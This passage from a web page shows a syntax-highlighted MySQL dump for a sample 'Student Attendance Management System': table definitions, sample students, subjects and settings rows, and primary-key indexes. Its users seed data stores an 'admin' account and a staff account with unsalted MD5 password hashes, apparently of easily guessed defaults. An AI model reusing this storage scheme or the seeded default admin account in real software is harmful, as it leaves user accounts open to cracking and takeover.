punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="166"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="167"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="168"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="169"></td><td><pre></pre></td></tr><tr><td data-num="170"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="171"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="172"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="173"></td><td><pre></pre></td></tr><tr><td data-num="174"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id_no</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="175"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'06232014'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Claire Blake'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 11:53:24'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="176"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'123456'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'George Wilson'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 15:20:57'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre></pre></td></tr><tr><td data-num="178"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="179"></td><td><pre></pre></td></tr><tr><td data-num="180"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="181"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="182"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="183"></td><td><pre></pre></td></tr><tr><td data-num="184"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="185"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="186"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subject</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="187"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">description</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="188"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span> datetime <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token function">current_timestamp</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="189"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="190"></td><td><pre></pre></td></tr><tr><td data-num="191"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="192"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="193"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="194"></td><td><pre></pre></td></tr><tr><td data-num="195"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subject</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">description</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">date_created</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="196"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Subject 1 '</span><span class="token punctuation">,</span> <span class="token string">'Subject 1 '</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:29:53'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="197"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'Subject 2'</span><span class="token punctuation">,</span> <span class="token string">'Subject 2'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:30:48'</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="198"></td><td><pre><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'Subject 3'</span><span class="token punctuation">,</span> <span class="token string">'Subject 3'</span><span class="token punctuation">,</span> <span class="token string">'2020-10-28 10:30:57'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="199"></td><td><pre></pre></td></tr><tr><td data-num="200"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="201"></td><td><pre></pre></td></tr><tr><td data-num="202"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="203"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="204"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="205"></td><td><pre></pre></td></tr><tr><td data-num="206"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="207"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="208"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="209"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">email</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="210"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">contact</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="211"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cover_img</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="212"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">about_content</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span></pre></td></tr><tr><td data-num="213"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="214"></td><td><pre></pre></td></tr><tr><td data-num="215"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="216"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="217"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="218"></td><td><pre></pre></td></tr><tr><td data-num="219"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">email</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">contact</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cover_img</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">about_content</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="220"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Student Attendance Management System'</span><span class="token punctuation">,</span> <span class="token string">'info@sample.comm'</span><span class="token punctuation">,</span> <span class="token string">'+6948 8542 623'</span><span class="token punctuation">,</span> <span class="token string">'1603344720_1602738120_pngtree-purple-hd-business-banner-image_5493.jpg'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;p style=&amp;quot;text-align: center; background: transparent; position: relative;&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color: rgb(0, 0, 0); font-family: &amp;amp;quot;Open Sans&amp;amp;quot;, Arial, sans-serif; font-weight: 400; text-align: justify;&amp;quot;&amp;gt;&amp;amp;nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&amp;rsquo;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p style=&amp;quot;text-align: center; background: transparent; position: relative;&amp;quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p style=&amp;quot;text-align: center; background: transparent; position: relative;&amp;quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="221"></td><td><pre></pre></td></tr><tr><td data-num="222"></td><td><pre><span class="token operator">--</span> <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span></pre></td></tr><tr><td data-num="223"></td><td><pre></pre></td></tr><tr><td data-num="224"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="225"></td><td><pre><span class="token operator">--</span> Table structure <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="226"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="227"></td><td><pre></pre></td></tr><tr><td data-num="228"></td><td><pre><span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="229"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="230"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="231"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">username</span><span class="token template-punctuation string">`</span></span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="232"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">password</span><span class="token template-punctuation string">`</span></span> text <span class="token constant">NOT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="233"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">type</span><span class="token template-punctuation string">`</span></span> <span class="token function">tinyint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">DEFAULT</span> <span class="token number">3</span> <span class="token constant">COMMENT</span> <span class="token string">'1=Admin,2=Staff'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="234"></td><td><pre>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty_id</span><span class="token template-punctuation string">`</span></span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">COMMENT</span> <span class="token string">'for faculty user only'</span></pre></td></tr><tr><td data-num="235"></td><td><pre><span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>InnoDB <span class="token constant">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8mb4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="236"></td><td><pre></pre></td></tr><tr><td data-num="237"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="238"></td><td><pre><span class="token operator">--</span> Dumping data <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="239"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="240"></td><td><pre></pre></td></tr><tr><td data-num="241"></td><td><pre><span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">users</span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">name</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">username</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">password</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">type</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty_id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span> <span class="token constant">VALUES</span></pre></td></tr><tr><td data-num="242"></td><td><pre><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'Administrator'</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'0192023a7bbd73250516f069df18b500'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="243"></td><td><pre><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'John Smith'</span><span class="token punctuation">,</span> <span class="token string">'jsmith@sample.com'</span><span class="token punctuation">,</span> <span class="token string">'af606ddc433ae6471f104872585cf880'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="244"></td><td><pre></pre></td></tr><tr><td data-num="245"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="246"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> dumped tables</pre></td></tr><tr><td data-num="247"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="248"></td><td><pre></pre></td></tr><tr><td data-num="249"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="250"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="251"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="252"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_list</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="253"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="254"></td><td><pre></pre></td></tr><tr><td data-num="255"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="256"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="257"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="258"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">attendance_record</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="259"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="260"></td><td><pre></pre></td></tr><tr><td data-num="261"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="262"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="263"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="264"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="265"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="266"></td><td><pre></pre></td></tr><tr><td data-num="267"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="268"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="269"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="270"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">class_subject</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="271"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="272"></td><td><pre></pre></td></tr><tr><td data-num="273"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="274"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="275"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="276"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">courses</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="277"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="278"></td><td><pre></pre></td></tr><tr><td data-num="279"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="280"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="281"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="282"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">faculty</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="283"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="284"></td><td><pre></pre></td></tr><tr><td data-num="285"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="286"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="287"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="288"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">students</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="289"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="290"></td><td><pre></pre></td></tr><tr><td data-num="291"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="292"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="293"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="294"></td><td><pre><span class="token constant">ALTER</span> <span class="token constant">TABLE</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">subjects</span><span class="token template-punctuation string">`</span></span></pre></td></tr><tr><td data-num="295"></td><td><pre>  <span class="token constant">ADD</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">id</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="296"></td><td><pre></pre></td></tr><tr><td data-num="297"></td><td><pre><span class="token operator">--</span></pre></td></tr><tr><td data-num="298"></td><td><pre><span class="token operator">--</span> Indexes <span class="token keyword">for</span> table <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">system_settings</span><span class="token template-punctuation 